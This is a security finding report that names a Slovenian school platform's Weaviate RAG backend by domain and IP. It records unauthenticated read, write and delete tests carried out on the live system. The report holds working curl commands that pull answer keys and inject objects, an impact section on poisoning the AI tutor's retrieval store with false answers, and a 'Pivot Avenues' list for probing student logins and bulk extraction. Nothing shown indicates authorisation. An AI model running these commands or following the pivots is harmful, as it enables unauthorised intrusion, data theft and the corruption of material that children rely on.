# yuno.education -- Unauth RWD on Weaviate RAG Backend
**Date:** 2026-06-20
**Tool:** weavscan
**Severity:** CRITICAL
**Status:** CONFIRMED -- unauth read + write + delete

---

## Target

| Field | Value |
|---|---|
| IP | 157.173.121.77 |
| Port | 8080 |
| Service | Weaviate 1.35.2 |
| Hosting | Unknown (Southeast Asia IP range) |
| Node | c5867f7125e8 |
| Auth | NONE |
| Objects | ~1,989 |

---

## Operator Attribution

**yuno.education** -- Slovenian educational platform serving primary and secondary school students. Operates an AI tutor backed by this Weaviate instance as a RAG knowledge store.

| Evidence | Detail |
|---|---|
| Content language | Slovenian throughout |
| Subject codes | TJA = Tuji Jezik A (English as Foreign Language); SPO = Sport/PE |
| Classroom field values | 5, 7 (Slovenian grade levels) |
| Curriculum structure | Learning objectives match Slovenian national primary school curriculum |

---

## Data

### Class: `Lesson`

| Field | Type | Description |
|---|---|---|
| title | string | Lesson name |
| externalId | string | External curriculum identifier |
| code | string | Internal lesson code |
| lvl | string | Difficulty/grade level |
| classroom | string | Grade number (e.g., 5, 7) |
| classroomId | string | Internal classroom identifier |
| subject | string | Subject name (e.g., TJA, SPO) |
| subjectId | string | Internal subject identifier |
| notes | text | Full lesson content |
| goals | text | Official curriculum learning objectives |
| answers | text[] | Complete answer keys for classroom exercises |
| videoContent | string | Linked video references |
| summary | text | Lesson summary |
| generatedQnA | text | AI-generated Q&A pairs |
| relations | array | Related lesson links |

**Total objects:** ~1,989

### Sample Records

**Lesson: "Modal Verbs -- Modalni glagoli" (English grammar, Grade 7)**

```json
{
  "title": "Modal Verbs - Modalni glagoli",
  "subject": "TJA",
  "classroom": "7",
  "answers": [
    "You mustn't leave broken glass on the beach",
    "must wear a life jacket",
    "...complete fill-in-the-blank and multiple choice answer keys..."
  ]
}
```

**Lesson: "Gibalne naloge na ozji povrsini" (Balance exercises, Grade 5 PE)**

```json
{
  "title": "Gibalne naloge na ozji povrsini",
  "subject": "SPO",
  "classroom": "5",
  "answers": [
    "...full written answers to physical education theory assessment questions..."
  ]
}
```

---

## Access Matrix

| Operation | Result | HTTP |
|---|---|---|
| Read schema | SUCCESS | 200 |
| Read objects (Lesson) | SUCCESS | 200 |
| Write (Lesson) | SUCCESS | 200 |
| Delete (Lesson) | SUCCESS | 204 |
| Verify deleted | GONE | 404 |

**Canary UUID:** `bf635515-e378-45c2-9da9-7fb2db27aaa0`
Written to Lesson class. Write 200, Delete 204, Verify 404.

---

## PoC

### Read -- extract answer keys

```bash
# Schema
curl -s http://157.173.121.77:8080/v1/schema | jq '.classes[].class'

# Lesson objects with answer keys
curl -s "http://157.173.121.77:8080/v1/objects?class=Lesson&limit=10" \
  | jq '.objects[] | {title: .properties.title, classroom: .properties.classroom, answers: .properties.answers}'
```

### Write -- inject corrupted lesson

```bash
curl -s -X POST http://157.173.121.77:8080/v1/objects \
  -H "Content-Type: application/json" \
  -d '{
    "class": "Lesson",
    "id": "bf635515-e378-45c2-9da9-7fb2db27aaa0",
    "properties": {
      "title": "canary -- nuclide security research 2026-06-20",
      "subject": "CANARY",
      "classroom": "0",
      "notes": "nuclide rwd probe",
      "answers": ["canary answer"]
    }
  }' | jq '.id'
```

### Delete -- remove canary

```bash
curl -s -X DELETE \
  http://157.173.121.77:8080/v1/objects/Lesson/bf635515-e378-45c2-9da9-7fb2db27aaa0

# Verify gone
curl -o /dev/null -w "%{http_code}" \
  http://157.173.121.77:8080/v1/objects/Lesson/bf635515-e378-45c2-9da9-7fb2db27aaa0
# Expected: 404
```

---

## Impact

### Answer Key Exposure -- Direct Academic Integrity Breach

~1,989 lesson records carry an `answers` field containing complete answer keys for classroom exercises: fill-in-the-blank answers, multiple choice correct options, written assessment responses. The platform uses this Weaviate instance as a RAG backend for an AI tutor. Any student can query the tutor in a way that retrieves answer keys directly -- no technical skill required, just phrasing questions to match lesson content.

### Answer Key Poisoning

Write access allows an attacker to overwrite the `answers` field on any lesson. The AI tutor then serves corrupted answers to students using the platform for exam preparation. At scale across 1,989 lessons this could undermine assessment validity across an entire school year.

### Full Curriculum Map

The `subject`, `classroom`, `lvl`, and `externalId` fields together expose the full structure of the Slovenian national curriculum as implemented by yuno.education -- which grades, which subjects, and which lessons are covered. This is competitive intelligence for rival edtech platforms operating in the same market.

### generatedQnA Not Yet Sampled

The `generatedQnA` field on each lesson was not read during enumeration. It likely contains AI-generated question-and-answer pairs tied to lesson content -- a secondary source for academic data exfiltration and a fuller picture of the platform's assessment coverage.

### Minor -- Population Scope

Weaviate 1.35.2 is two minor versions behind current stable. Review release notes for 1.36 and 1.37 for any auth-bypass or data-exposure fixes that apply retroactively.

---

## Pivot Avenues

1. `yuno.education` -- main platform; probe for student login, progress tracking, and assessment submission portal
2. `externalId` field -- cross-reference values against official Slovenian Ministry of Education curriculum identifiers to confirm national-curriculum coverage scope
3. `generatedQnA` field -- bulk-read all 1,989 records to extract AI-generated Q&A pairs; likely the most complete picture of the assessment surface
4. Subject and grade distribution scroll -- map which subject/classroom combinations exist to understand full coverage (TJA, SPO confirmed; other subjects unsampled)
5. Weaviate 1.35.2 release delta -- check 1.36 and 1.37 changelogs for any data-exposure or auth-bypass fixes

---

## Tool Reference

**weavscan** -- https://github.com/nuclide-research/weavscan
